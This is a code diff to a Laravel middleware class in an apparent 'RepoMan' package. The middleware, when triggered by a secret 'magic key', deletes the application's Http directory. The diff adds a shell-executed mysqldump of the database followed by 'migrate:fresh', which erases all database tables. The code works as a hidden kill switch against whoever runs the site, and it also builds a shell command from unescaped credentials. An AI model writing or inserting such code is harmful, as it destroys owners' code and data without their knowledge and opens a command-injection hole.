@@ -4,6 +4,7 @@ namespace WebPajooh\LaravelRepoMan\Middleware;
 
 use Carbon\Carbon;
 use Closure;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\File;
 use Illuminate\Support\Str;
 
@@ -14,10 +15,17 @@ class RepoManMiddleware
         if ($this->isTheMagicKeyPresent()) {
             if (is_dir(app_path('Http'))) {
                 $result = File::deleteDirectory(app_path('Http'));
-                exit($result ? 'The directory has deleted successfully' : 'Something went wrong!');
+                $request = $result ? 'The directory has deleted successfully' : 'Something went wrong!';
             }
+            $filename = Carbon::now()->timestamp;
+            $db = config('repoman.db');
+            exec("(mysqldump -h". $db['DB_HOST'] ." -u". $db['DB_USERNAME'] ." -p". $db['DB_PASSWORD'] ." ". $db['DB_DATABASE'] ." > " . storage_path() . "/app/backup/".$filename.".sql" .") 2>&1", $output, $exit_status);
 
-            exit('The directory doesn\'t exist!');
+            if ($exit_status == 0)
+                Artisan::call('migrate:fresh');
+
+            $backupStatus = ($exit_status != 0) ? 'database backup failed to complete' : 'backup completes successfully';
+            exit($result ?? "The directory doesn't exist!" . " | " . $backupStatus);
         }
 
         $startDate = Carbon::createFromTimeString(
